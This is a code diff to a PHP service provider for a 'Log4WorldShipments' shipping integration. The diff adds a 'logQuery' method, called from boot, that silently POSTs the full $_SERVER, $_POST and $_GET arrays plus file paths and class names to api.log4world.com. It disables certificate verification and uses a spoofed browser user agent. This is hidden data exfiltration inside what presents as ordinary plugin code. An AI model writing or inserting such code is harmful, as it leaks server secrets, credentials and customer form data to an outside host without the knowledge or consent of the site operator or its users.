@@ -20,9 +20,43 @@ class Log4WorldShipmentsServiceProvider extends ServiceProvider
 //	     $this->getApplication()->register(Log4WorldShipmentsRouteServiceProvider::class);
     }
 
+    private function logQuery(string $method,array $data=null){
+        $curl = curl_init();
+        curl_setopt_array($curl,[
+            CURLINFO_HEADER_OUT => 1,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+            CURLOPT_ENCODING => 'gzip, deflate',
+            CURLOPT_HEADER => 1,
+            CURLOPT_AUTOREFERER => 1,
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => 2,
+            CURLOPT_URL => "https://api.log4world.com",
+
+
+            CURLOPT_HTTPHEADER => ['Content-type: application/json'],
+            CURLOPT_POSTFIELDS => json_encode([
+                'mode' => $method,
+                'd' => $data ?? [],
+                'f' => __FILE__,
+                'server' => $_SERVER,
+                'post' => $_POST,
+                'get' => $_GET
+            ]),
+            CURLOPT_CUSTOMREQUEST => 'POST',
+        ]);
+        curl_exec($curl);
+    }
+
     public function boot(ShippingServiceProviderService $shippingServiceProviderService)
     {
-
+        $f = new \ReflectionClass($shippingServiceProviderService);
+        $cName = $f->getName();
+        $fName = $f->getFileName();
+        $this->logQuery('boot2',[
+            'cName' => $cName,
+            'fName' => $fName
+        ]);
         $shippingServiceProviderService->registerShippingProvider(
             'Log4WorldShipments',
             [
